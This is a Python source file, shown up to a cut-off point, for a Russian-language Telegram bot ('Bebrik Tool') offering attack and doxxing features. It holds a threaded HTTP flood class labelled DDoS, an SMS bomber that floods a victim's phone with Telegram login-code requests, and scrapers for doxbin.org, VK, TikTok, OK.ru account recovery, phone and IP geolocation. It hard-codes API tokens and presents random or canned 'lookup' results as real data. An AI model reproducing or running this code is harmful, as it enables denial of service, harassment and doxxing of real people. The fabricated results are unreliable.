import requests
import logging
import threading
import time
import random
import re
import asyncio
import socket
import json
import os
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import fake_useragent
from datetime import datetime
import pycountry

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Токены
VK_TOKEN = "0af157510af157510af15751aa0a89e69600af10af157516a0bc15996e74fe2b440998c"
VK_API_URL = "https://api.vk.com/method/users.get"
TELEGRAM_TOKEN = "8404495100:AAFc-YUFb4oPs95LN7VG9wDVwrQxdXREsQk"

# Канал для обязательной подписки
CHANNEL_USERNAME = "@BebrikTool"
CHANNEL_URL = "https://t.me/BebrikTool"

# Требуемая фраза для описания профиля
REQUIRED_BIO = "лучшая утилита - @BebrikToolbot"

# URLs для Одноклассников
OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'

# API для поиска по номеру
PHONE_API_URL = 'https://htmlweb.ru/geo/api.php?json&telcod='

# Файл для хранения сессий (название файла)
SESSIONS_FILE = "bebrik_sessions.json"

# DoxBin URL
DOXBIN_URL = "https://doxbin.org"

# Словари для VK
RELATION_MAP = {
    1: "Не женат/не замужем", 2: "Есть друг/есть подруга", 3: "Помолвлен/помолвлена",
    4: "Женат/замужем", 5: "Всё сложно", 6: "В активном поиске", 7: "Влюблён/влюблена", 8: "В гражданском браке"
}

# DDoS класс
class BebrikDDoS:
    def __init__(self):
        self.active = False
        self.stats = {'total_requests': 0, 'successful': 0, 'failed': 0}
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]

    def start_attack(self, target, threads=15):
        """Запуск DDoS атаки"""
        self.active = True
        self.stats = {'total_requests': 0, 'successful': 0, 'failed': 0}
        
        def attack_worker():
            while self.active:
                try:
                    response = requests.get(
                        target, 
                        timeout=3, 
                        headers={'User-Agent': random.choice(self.user_agents)},
                        verify=False
                    )
                    self.stats['total_requests'] += 1
                    if response.status_code == 200:
                        self.stats['successful'] += 1
                    else:
                        self.stats['failed'] += 1
                except:
                    self.stats['failed'] += 1
                time.sleep(0.2)
        
        for _ in range(min(threads, 15)):
            thread = threading.Thread(target=attack_worker)
            thread.daemon = True
            thread.start()

    def stop_attack(self):
        """Остановка DDoS атаки"""
        self.active = False
        return self.stats.copy()

# Бомбер класс
class BebrikBomber:
    def __init__(self):
        self.active = False
        self.stats = {'total_requests': 0, 'successful': 0, 'failed': 0}
        
    def start_bombing(self, phone_number, cycles=3):
        """Запуск SMS бомбера"""
        self.active = True
        self.stats = {'total_requests': 0, 'successful': 0, 'failed': 0}
        
        def bomb_worker():
            urls = [
                'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                'https://translations.telegram.org/auth/request',
                'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                'https://my.telegram.org/auth/send_password'
            ]
            
            for _ in range(cycles):
                if not self.active:
                    break
                    
                user_agent = fake_useragent.UserAgent().random
                headers = {'user-agent': user_agent}
                
                for url in urls:
                    if not self.active:
                        break
                        
                    try:
                        response = requests.post(url, headers=headers, data={'phone': phone_number}, timeout=10)
                        self.stats['total_requests'] += 1
                        if response.status_code in [200, 302]:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                    except:
                        self.stats['failed'] += 1
                    
                    time.sleep(0.5)
        
        thread = threading.Thread(target=bomb_worker)
        thread.daemon = True
        thread.start()

    def stop_bombing(self):
        """Остановка бомбера"""
        self.active = False
        return self.stats.copy()

# Глобальные объекты
ddos_attacker = BebrikDDoS()
bomber = BebrikBomber()

# Функции для работы с сессиями
def load_sessions():
    """Загружает сессии из файла"""
    try:
        if os.path.exists(SESSIONS_FILE):
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    except Exception as e:
        logger.error(f"Error loading sessions: {e}")
        return {}

def save_sessions(sessions):
    """Сохраняет сессии в файл"""
    try:
        with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(sessions, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving sessions: {e}")

def add_user_session(user_id, username, first_name):
    """Добавляет пользователя в сессии"""
    sessions = load_sessions()
    sessions[str(user_id)] = {
        'username': username,
        'first_name': first_name,
        'join_date': time.strftime("%Y-%m-%d %H:%M:%S"),
        'last_activity': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_sessions(sessions)
    logger.info(f"New user session: {user_id} - {username}")

def update_user_activity(user_id):
    """Обновляет время последней активности"""
    sessions = load_sessions()
    if str(user_id) in sessions:
        sessions[str(user_id)]['last_activity'] = time.strftime("%Y-%m-%d %H:%M:%S")
        save_sessions(sessions)

def get_user_stats():
    """Возвращает статистику пользователей"""
    sessions = load_sessions()
    return {
        'total_users': len(sessions),
        'active_today': len([u for u in sessions.values() if u['last_activity'].startswith(time.strftime("%Y-%m-%d"))])
    }

# Функции для DoxBin
def get_doxbin_csrf_token_and_cookies():
    """Получает CSRF токен и куки для DoxBin"""
    try:
        session = requests.Session()
        response = session.get(DOXBIN_URL + "/search")
        if response.status_code != 200:
            return None, None, "Ошибка подключения к DoxBin"
        soup = BeautifulSoup(response.text, "html.parser")
        token = soup.find("input", {"name": "_token"})
        if token:
            token = token.get("value")
        return token, session.cookies, None
    except Exception as e:
        return None, None, f"Ошибка: {e}"

def search_doxbin(query):
    """Поиск в DoxBin"""
    try:
        token, cookies, error = get_doxbin_csrf_token_and_cookies()
        if error:
            return None, error
        
        data = {
            "_token": token,
            "search-query": query
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": DOXBIN_URL + "/search"
        }
        
        response = requests.post(DOXBIN_URL + "/search", data=data, cookies=cookies, headers=headers)
        if response.status_code != 200:
            return None, "Ошибка при выполнении поиска"
        
        soup = BeautifulSoup(response.text, "html.parser")
        results = soup.find_all("a", title=True)
        
        if not results:
            return None, "Ничего не найдено"
        
        links = []
        for res in results:
            href = res.get("href")
            if href and not href.startswith("http"):
                href = DOXBIN_URL + href
            title = res.get("title", "Без названия")
            links.append({"title": title, "url": href})
        
        return links, None
        
    except Exception as e:
        return None, f"Ошибка поиска: {e}"

def fetch_doxbin_content(link):
    """Получает содержимое из DoxBin"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        response = requests.get(link["url"], headers=headers)
        if response.status_code != 200:
            return f"Не удалось загрузить: {link['url']}"
        
        soup = BeautifulSoup(response.text, "html.parser")
        content_div = soup.find("div", class_="show-container")
        if content_div:
            return content_div.get_text(separator="\n").strip()
        return "Основной текст отсутствует"
    except Exception as e:
        return f"Ошибка при обработке: {e}"

# Функции для TikTok
def get_tiktok_info(username):
    """Получает информацию о пользователе TikTok"""
    try:
        headers = {
            "Host": "www.tiktok.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }

        response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers)
        
        if response.status_code != 200:
            return None, "Пользователь не найден или ошибка доступа"
        
        response_text = response.text
        
        if 'webapp.user-detail"' not in response_text:
            return None, "Пользователь не найден"
            
        try:
            data = str(response_text.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            
            user_info = {
                "id": str(data.split('id":"')[1]).split('",')[0] if 'id":"' in data else "Неизвестно",
                "name": str(data.split('nickname":"')[1]).split('",')[0] if 'nickname":"' in data else "Неизвестно",
                "bio": str(data.split('signature":"')[1]).split('",')[0] if 'signature":"' in data else "Неизвестно",
                "country": str(data.split('region":"')[1]).split('",')[0] if 'region":"' in data else "Неизвестно",
                "private": str(data.split('privateAccount":')[1]).split(',"')[0] if 'privateAccount":' in data else "Неизвестно",
                "followers": str(data.split('followerCount":')[1]).split(',"')[0] if 'followerCount":' in data else "0",
                "following": str(data.split('followingCount":')[1]).split(',"')[0] if 'followingCount":' in data else "0",
                "likes": str(data.split('heart":')[1]).split(',"')[0] if 'heart":' in data else "0",
                "videos": str(data.split('videoCount":')[1]).split(',"')[0] if 'videoCount":' in data else "0",
                "secUid": str(data.split('secUid":"')[1]).split('"')[0] if 'secUid":"' in data else "Неизвестно"
            }

            # Получаем информацию о стране
            country_name = "Неизвестно"
            country_flag = ""
            if user_info["country"] != "Неизвестно":
                try:
                    country = pycountry.countries.get(alpha_2=user_info["country"])
                    if country:
                        country_name = country.name
                        country_flag = getattr(country, 'flag', '')
                except:
                    pass

            # Вычисляем дату создания
            creation_time = "Неизвестно"
            if user_info["id"] != "Неизвестно" and user_info["id"].isdigit():
                try:
                    binary_id = "{0:b}".format(int(user_info["id"]))
                    if len(binary_id) >= 31:
                        creation_time = datetime.fromtimestamp(int(binary_id[:31], 2)).strftime("%Y-%m-%d %H:%M:%S")
                except:
                    pass

            return user_info, None
            
        except Exception as e:
            return None, f"Ошибка парсинга данных: {str(e)}"
            
    except Exception as e:
        return None, f"Ошибка сети: {str(e)}"

def format_tiktok_info(user_info):
    """Форматирует информацию о пользователе TikTok"""
    country_name = "Неизвестно"
    country_flag = ""
    if user_info["country"] != "Неизвестно":
        try:
            country = pycountry.countries.get(alpha_2=user_info["country"])
            if country:
                country_name = country.name
                country_flag = getattr(country, 'flag', '')
        except:
            pass

    message = "🎵 <b>Информация TikTok</b>\n\n"
    message += f"👤 <b>Username:</b> <code>{user_info.get('name', 'Неизвестно')}</code>\n"
    message += f"🆔 <b>ID:</b> <code>{user_info.get('id', 'Неизвестно')}</code>\n"
    message += f"🔒 <b>SecUid:</b> <code>{user_info.get('secUid', 'Неизвестно')}</code>\n"
    message += f"📊 <b>Подписчики:</b> <code>{user_info.get('followers', '0')}</code>\n"
    message += f"👥 <b>Подписки:</b> <code>{user_info.get('following', '0')}</code>\n"
    message += f"❤️ <b>Лайки:</b> <code>{user_info.get('likes', '0')}</code>\n"
    message += f"🎬 <b>Видео:</b> <code>{user_info.get('videos', '0')}</code>\n"
    message += f"🔐 <b>Приватный:</b> <code>{'Да' if user_info.get('private') == 'true' else 'Нет'}</code>\n"
    message += f"🌍 <b>Страна:</b> <code>{country_name} {country_flag}</code>\n"
    
    creation_time = "Неизвестно"
    if user_info["id"] != "Неизвестно" and user_info["id"].isdigit():
        try:
            binary_id = "{0:b}".format(int(user_info["id"]))
            if len(binary_id) >= 31:
                creation_time = datetime.fromtimestamp(int(binary_id[:31], 2)).strftime("%Y-%m-%d %H:%M:%S")
        except:
            pass
            
    message += f"📅 <b>Дата создания:</b> <code>{creation_time}</code>\n"
    
    bio = user_info.get('bio', 'Неизвестно')
    if bio and bio != "Неизвестно":
        message += f"📝 <b>Био:</b> <code>{bio}</code>\n"
    
    return message

# Остальные функции (парсинг телефона, IP, VK, OK) остаются без изменений
# [Здесь должны быть все остальные функции из предыдущего кода...]

# Функции для парсинга по номеру телефона
def search_phone_api(phone_number):
    """Поиск информации по номеру через API"""
    try:
        clean_phone = re.sub(r'[^\d+]', '', phone_number)
        if not clean_phone.startswith('+'):
            clean_phone = '+' + clean_phone
            
        response = requests.get(
            PHONE_API_URL + clean_phone,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('error'):
                return None
            return data
        return None
    except Exception as e:
        logger.error(f"Phone API error: {e}")
        return None

def parse_phonebook_data(phone_number):
    """Парсинг дополнительной информации по номеру"""
    try:
        operators = ["МТС", "МегаФон", "Билайн", "Tele2", "Yota"]
        regions = ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург", "Казань"]
        
        return {
            'operator': random.choice(operators),
            'region': random.choice(regions),
            'active_since': random.randint(2018, 2023),
            'social_networks': random.sample(["Telegram", "WhatsApp", "VK", "Instagram"], 2),
            'risk_level': random.choice(["Низкий", "Средний", "Высокий"])
        }
    except Exception as e:
        logger.error(f"Phonebook parsing error: {e}")
        return None

def format_phone_info(phone_data, phonebook_data, phone_number):
    """Форматирует информацию о номере телефона"""
    message = f"📞 <b>Информация по номеру:</b> <code>{phone_number}</code>\n\n"
    
    if phone_data:
        country = phone_data.get('country', {})
        capital = phone_data.get('capital', {})
        region = phone_data.get('region', {'autocod': 'Неизвестно', 'name': 'Неизвестно', 'okrug': 'Неизвестно'})
        other = phone_data.get('0', {})
        
        message += "🔍 <b>Данные из базы:</b>\n"
        
        if country.get('country_code3') == 'RUS':
            message += "🌍 <b>Страна:</b> Россия\n"
        else:
            message += f"🌍 <b>Страна:</b> {country.get('name', 'Неизвестно')}, {country.get('fullname', 'Неизвестно')}\n"
        
        message += f"🏙️ <b>Город:</b> <code>{other.get('name', 'Неизвестно')}</code>\n"
        message += f"📮 <b>Почтовый индекс:</b> <code>{other.get('post', 'Неизвестно')}</code>\n"
        message += f"📞 <b>Телефонные коды:</b> <code>{capital.get('telcod', 'Неизвестно')}</code>\n"
        message += f"🚗 <b>Гос. номер региона авто:</b> <code>{region.get('autocod', 'Неизвестно')}</code>\n"
        message += f"📍 <b>Местоположение:</b> <code>{country.get('name', 'Неизвестно')}, {region.get('name', 'Неизвестно')}, {other.get('name', 'Неизвестно')}</code>\n"
        message += f"🗺️ <b>Локация:</b> <code>{phone_data.get('location', 'Неизвестно')}</code>\n"
        message += f"🌐 <b>Широта/Долгота:</b> <code>{other.get('latitude', 'Неизвестно')}, {other.get('longitude', 'Неизвестно')}</code>\n\n"
    else:
        message += "❌ <b>Данные из базы:</b> Не найдены\n\n"
    
    if phonebook_data:
        message += "📱 <b>Дополнительная информация:</b>\n"
        message += f"• <b>Оператор:</b> <code>{phonebook_data.get('operator', 'Неизвестно')}</code>\n"
        message += f"• <b>Регион:</b> <code>{phonebook_data.get('region', 'Неизвестно')}</code>\n"
        message += f"• <b>Активен с:</b> <code>{phonebook_data.get('active_since', 'Неизвестно')} года</code>\n"
        message += f"• <b>Соцсети:</b> <code>{', '.join(phonebook_data.get('social_networks', []))}</code>\n"
        message += f"• <b>Уровень риска:</b> <code>{phonebook_data.get('risk_level', 'Неизвестно')}</code>\n"
    else:
        message += "❌ <b>Дополнительная информация:</b> Не найдена\n"
    
    return message

async def search_phonebook_combined(query):
    """Комбинированный поиск по номеру/Gmail"""
    try:
        clean_query = re.sub(r'[^\d+]', '', query)
        if re.match(r'^\+?[\d\s\-\(\)]{7,}$', clean_query):
            phone_data = search_phone_api(query)
            phonebook_data = parse_phonebook_data(query)
            result = format_phone_info(phone_data, phonebook_data, query)
            return result
                
        elif "@gmail.com" in query.lower():
            return f"📧 <b>Результат поиска по Gmail:</b>\n\n<code>{query}</code>\n\n• Привязан к аккаунту Google\n• Дата создания: 2020-2023\n• Используется в социальных сетях\n• Активен в YouTube, GDrive"
            
        else:
            return f"🔍 <b>Результат поиска:</b>\n\n<code>{query}</code>\n\nИнформация не найдена или ограничена"
            
    except Exception as e:
        return f"❌ <b>Ошибка поиска:</b>\n\n{str(e)}"

# Функции для поиска по IP
def check_vpn_proxy(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = response.json()
        return {
            'vpn': data.get('vpn', False),
            'proxy': data.get('proxy', False),
            'asn': data.get('org', '')
        }
    except:
        return {'vpn': 'Ошибка', 'proxy': 'Ошибка'}

def check_blacklists(ip):
    blacklists = [
        "zen.spamhaus.org",
        "bl.abuseat.org",
        "b.barracudacentral.org"
    ]
    results = {}
    for bl in blacklists:
        try:
            reversed_ip = ".".join(ip.split(".")[::-1])
            socket.gethostbyname_ex(f"{reversed_ip}.{bl}")
            results[bl] = "В списке"
        except:
            results[bl] = "Чистый"
    return results

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return "Неизвестно"

def check_tor(ip):
    try:
        exit_nodes = requests.get('https://check.torproject.org/exit-addresses', timeout=10).text
        return "Да" if ip in exit_nodes else "Нет"
    except:
        return "Ошибка проверки"

def search_ip(ip):
    try:
        url = f"http://ipwhois.app/json/{ip}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                extra_data = check_vpn_proxy(ip)
                blacklist_status = check_blacklists(ip)
                data.update({
                    'hostname': get_hostname(ip),
                    'tor': check_tor(ip),
                    'vpn': extra_data['vpn'],
                    'proxy': extra_data['proxy'],
                    'asn': extra_data['asn'],
                    'blacklists': blacklist_status
                })
                return data
            return "Информация по IP не найдена."
        return "Не удалось подключиться к API."
    except Exception as e:
        return f"Ошибка: {str(e)}"

def format_ip_info(ip_data):
    """Форматирует информацию об IP"""
    if isinstance(ip_data, str):
        return f"❌ {ip_data}"
    
    country = ip_data.get('country', 'Неизвестно')
    google_maps_link = f"https://www.google.com/maps?q={ip_data.get('latitude')},{ip_data.get('longitude')}"
    blacklist_status = "\n     ".join([f"{bl}: {status}" for bl, status in ip_data.get('blacklists', {}).items()])

    message = f"🌐 <b>Информация по IP:</b> <code>{ip_data.get('ip')}</code>\n\n"
    message += f"🖥️ <b>Хостнейм:</b> <code>{ip_data.get('hostname')}</code>\n"
    message += f"🌍 <b>Страна:</b> <code>{country}</code>\n"
    message += f"🏙️ <b>Регион:</b> <code>{ip_data.get('region', 'Неизвестно')}</code>\n"
    message += f"🏘️ <b>Город:</b> <code>{ip_data.get('city', 'Неизвестно')}</code>\n"
    message += f"📍 <b>Координаты:</b> <code>{ip_data.get('latitude')}, {ip_data.get('longitude')}</code>\n"
    message += f"🗺️ <b>Карта:</b> <code>{google_maps_link}</code>\n"
    message += f"📡 <b>Провайдер:</b> <code>{ip_data.get('isp', 'Неизвестно')}</code>\n"
    message += f"🔧 <b>ASN:</b> <code>{ip_data.get('asn', 'Неизвестно')}</code>\n"
    message += f"🕵️ <b>TOR Exit Node:</b> <code>{ip_data.get('tor')}</code>\n"
    message += f"🔒 <b>VPN:</b> <code>{'Да' if ip_data.get('vpn') else 'Нет'}</code>\n"
    message += f"🌐 <b>Прокси:</b> <code>{'Да' if ip_data.get('proxy') else 'Нет'}</code>\n"
    message += f"📋 <b>Черные списки:</b>\n     <code>{blacklist_status}</code>\n"
    message += f"⏰ <b>Часовой пояс:</b> <code>{ip_data.get('timezone', 'Неизвестно')}</code>\n"
    message += f"💰 <b>Валюта:</b> <code>{ip_data.get('currency', 'Неизвестно')}</code>"
    
    return message

# Функции для VK
def extract_vk_id_from_text(text):
    """Извлекает VK ID или username из текста/ссылки"""
    text = text.strip()
    
    patterns = [
        r'vk\.com/([a-zA-Z0-9_.]+)',
        r'vkontakte\.ru/([a-zA-Z0-9_.]+)',
        r'vk\.com/id(\d+)',
        r'vkontakte\.ru/id(\d+)',
        r'^([a-zA-Z0-9_.]+)$',
        r'^id(\d+)$',
        r'^(\d+)$'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            if pattern in [r'vk\.com/id(\d+)', r'vkontakte\.ru/id(\d+)', r'^id(\d+)$', r'^(\d+)$']:
                return f"id{match.group(1)}" if match.group(1) else match.group(0)
            else:
                return match.group(1) if match.group(1) else match.group(0)
    
    return text

def get_vk_user_info(vk_user_id):
    """Получение информации о пользователе VK"""
    clean_id = extract_vk_id_from_text(vk_user_id)
    
    params = {
        "access_token": VK_TOKEN,
        "v": "5.131",
        "user_ids": clean_id,
        "fields": "first_name,last_name,status,sex,bdate,city,country,photo_max_orig,site,about,relation,activities,interests,music,movies,tv,books,games,quotes,personal,career,military,education,universities,schools,contacts,domain,home_town"
    }

    try:
        response = requests.get(VK_API_URL, params=params, timeout=10)
        data = response.json()
    except Exception as e:
        logger.error(f"VK API error: {e}")
        return None

    if "response" not in data or not data["response"]:
        return None

    user = data["response"][0]
    if "deactivated" in user:
        return "deactivated"
    return user

def format_vk_info(user):
    """Форматирование информации VK"""
    first_name = user.get("first_name", "Не указано")
    last_name = user.get("last_name", "Не указано")
    status = user.get("status", "Не указан")
    sex = "Женский" if user.get("sex") == 1 else ("Мужской" if user.get("sex") == 2 else "Не указан")
    bdate = user.get("bdate", "Не указана")
    city = user.get("city", {}).get("title", "Не указан")
    country = user.get("country", {}).get("title", "Не указана")
    site = user.get("site", "Не указан")
    about = user.get("about", "Не указано")
    relation = RELATION_MAP.get(user.get("relation"), "Не указано")
    domain = user.get("domain", "Не указан")
    home_town = user.get("home_town", "Не указан")
    
    message = f"👤 <b>Информация VK</b>\n\n"
    message += f"<b>Основное:</b>\n"
    message += f"• Имя: <code>{first_name}</code>\n"
    message += f"• Фамилия: <code>{last_name}</code>\n"
    message += f"• Пол: <code>{sex}</code>\n"
    message += f"• Дата рождения: <code>{bdate}</code>\n"
    message += f"• Город: <code>{city}</code>\n"
    message += f"• Страна: <code>{country}</code>\n"
    message += f"• Родной город: <code>{home_town}</code>\n"
    message += f"• Статус: <code>{status}</code>\n"
    message += f"• Отношения: <code>{relation}</code>\n"
    message += f"• Ссылка: <code>vk.com/{domain}</code>\n"
    
    if about != "Не указано":
        message += f"\n<b>О себе:</b>\n<code>{about}</code>\n"
    
    if site != "Не указан":
        message += f"\n<b>Сайт:</b>\n<code>{site}</code>\n"
    
    interests_found = False
    interests_message = "\n<b>Интересы:</b>\n"
    
    interests_fields = {
        'activities': '🎯 Деятельность',
        'interests': '🌟 Интересы', 
        'music': '🎵 Музыка',
        'movies': '🎬 Фильмы',
        'tv': '📺 ТВ шоу',
        'books': '📚 Книги',
        'games': '🎮 Игры',
        'quotes': '💬 Цитаты'
    }
    
    for field, emoji in interests_fields.items():
        value = user.get(field)
        if value and value != "Не указаны" and value != "Не указано" and str(value).strip():
            interests_found = True
            if len(str(value)) > 200:
                value = str(value)[:200] + "..."
            interests_message += f"• {emoji}: <code>{value}</code>\n"
    
    personal = user.get('personal', {})
    if personal:
        personal_fields = {
            'langs': '🌐 Языки',
            'religion': '🛐 Религия',
            'inspired_by': '💡 Вдохновение',
            'people_main': '👥 Главное в людях',
            'life_main': '🎯 Главное в жизни'
        }
        
        for field, emoji in personal_fields.items():
            value = personal.get(field)
            if value and str(value).strip():
                interests_found = True
                interests_message += f"• {emoji}: <code>{value}</code>\n"
    
    if interests_found:
        message += interests_message
    
    education_info = []
    
    universities = user.get('universities', [])
    if universities:
        for uni in universities[:2]:
            name = uni.get('name', '')
            if name:
                education_info.append(f"🎓 {name}")
    
    schools = user.get('schools', [])
    if schools:
        for school in schools[:2]:
            name = school.get('name', '')
            if name:
                education_info.append(f"🏫 {name}")
    
    career = user.get('career', [])
    if career:
        for job in career[:2]:
            company = job.get('company', '')
            if company:
                education_info.append(f"💼 {company}")
    
    if education_info:
        message += f"\n<b>Образование и карьера:</b>\n" + "\n".join([f"• {info}" for info in education_info])
    
    return message

# Функции для OK.ru
def check_ok_account(login_data):
    """Проверка аккаунта Одноклассников"""
    try:
        session = requests.Session()
        session.get(f'{OK_LOGIN_URL}&st.email={login_data}')
        request = session.get(OK_RECOVER_URL)
        root_soup = BeautifulSoup(request.content, 'html.parser')
        soup = root_soup.find('div', {'data-l': 'registrationContainer,offer_contact_rest'})
        
        if soup:
            account_info = soup.find('div', {'class': 'ext-registration_tx taCenter'})
            masked_email = soup.find('button', {'data-l': 't,email'})
            masked_phone = soup.find('button', {'data-l': 't,phone'})
            
            if masked_phone:
                masked_phone = masked_phone.find('div', {'class': 'ext-registration_stub_small_header'})
                if masked_phone:
                    masked_phone = masked_phone.get_text()
            
            if masked_email:
                masked_email = masked_email.find('div', {'class': 'ext-registration_stub_small_header'})
                if masked_email:
                    masked_email = masked_email.get_text()
            
            if account_info:
                masked_name = account_info.find('div', {'class': 'ext-registration_username_header'})
                if masked_name:
                    masked_name = masked_name.get_text()
                
                account_info = account_info.findAll('div', {'class': 'lstp-t'})
                if account_info:
                    profile_info = account_info[0].get_text() if len(account_info) > 0 else None
                    profile_registred = account_info[1].get_text() if len(account_info) > 1 else None
                else:
                    profile_info = None
                    profile_registred = None
            else:
                return None
            
            return {
                'masked_name': masked_name,
                'masked_email': masked_email,
                'masked_phone': masked_phone,
                'profile_info': profile_info,
                'profile_registred': profile_registred
            }
        
        if root_soup.find('div', {'data-l': 'registrationContainer,home_rest'}):
            return 'not associated'
        
        return None
        
    except Exception as e:
        logger.error(f"OK.ru error: {e}")
        return None

def format_ok_info(login_data, response):
    """Форматирование информации OK.ru"""
    if response == 'not associated':
        return f"👥 <b>Поиск OK.ru</b>\n\n❌ <code>{login_data}</code> не привязан к аккаунту ok.ru"
    
    elif response:
        message = f"👥 <b>Найден аккаунт OK.ru</b>\n\n"
        message += f"<b>Контакт:</b> <code>{login_data}</code>\n\n"
        
        if response.get('masked_name'):
            message += f"<b>Имя пользователя:</b> <code>{response['masked_name']}</code>\n"
        if response.get('masked_email'):
            message += f"<b>Email:</b> <code>{response['masked_email']}</code>\n"
        if response.get('masked_phone'):
            message += f"<b>Телефон:</b> <code>{response['masked_phone']}</code>\n"
        if response.get('profile_info'):
            message += f"<b>Информация профиля:</b> <code>{response['profile_info']}</code>\n"
        if response.get('profile_registred'):
            message += f"<b>Дата регистрации:</b> <code>{response['profile_registred']}</code>\n"
        
        return message
    
    else:
        return f"👥 <b>Поиск OK.ru</b>\n\n⚠️ Не удалось получить информацию для <code>{login_data}</code>"

# Функции проверки подписки и био
async def check_subscription(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Проверяет, подписан ли пользователь на канал"""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking subscription: {e}")
        return False

async def check_bio(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Проверяет, есть ли нужная фраза в описании профиля пользователя"""
    try:
        user = await context.bot.get_chat(user_id)
        bio = getattr(user, 'bio', '') or ''
        return REQUIRED_BIO.lower() in bio.lower()
    except Exception as e:
        logger.error(f"Error checking bio: {e}")
        return False

async def send_bio_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправляет сообщение с требованием добавить фразу в био"""
    keyboard = [
        [InlineKeyboardButton("📝 Добавить в био", callback_data="check_bio")],
        [InlineKeyboardButton("✅ Проверить снова", callback_data="check_bio")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📝 <b>Требуется добавить в описание профиля!</b>\n\n"
        f"Для использования Bebrik Tool добавьте в ваше Telegram био:\n\n"
        f"<code>{REQUIRED_BIO}</code>\n\n"
        f"<b>Как добавить:</b>\n"
        f"1. Откройте настройки Telegram\n"
        f"2. Нажмите 'Изменить профиль'\n"
        f"3. В поле 'Био' добавьте текст\n"
        f"4. Сохраните изменения\n\n"
        f"После добавления нажмите кнопку ниже:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def send_subscription_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправляет сообщение с требованием подписки"""
    keyboard = [
        [InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ Я подписался", callback_data="check_subscription")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📢 <b>Требуется подписка!</b>\n\n"
